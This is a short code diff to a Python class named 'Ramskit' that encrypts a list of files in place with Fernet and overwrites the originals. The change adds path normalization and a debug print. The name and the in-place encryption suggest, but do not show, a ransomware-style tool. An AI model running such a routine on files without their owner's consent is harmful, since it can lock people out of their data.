@@ -14,6 +14,7 @@ GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>. """
+import os.path
 
 from cryptography.fernet import Fernet
 
@@ -38,12 +39,15 @@ class Ramskit:
         fernet = Fernet(key)
 
         for item in items:
-            with open(item, 'rb') as file:
+            normalized_item = os.path.normpath(item)
+            print(f"[Debug] Opening file: {normalized_item}")  # Debug message
+
+            with open(normalized_item, 'rb') as file:
                 data = file.read()
 
             encrypted = fernet.encrypt(data)
 
-            with open(item, 'wb') as file:
+            with open(normalized_item, 'wb') as file:
                 file.write(encrypted)
 
     def decrypt_file(self, items, key) -> None:
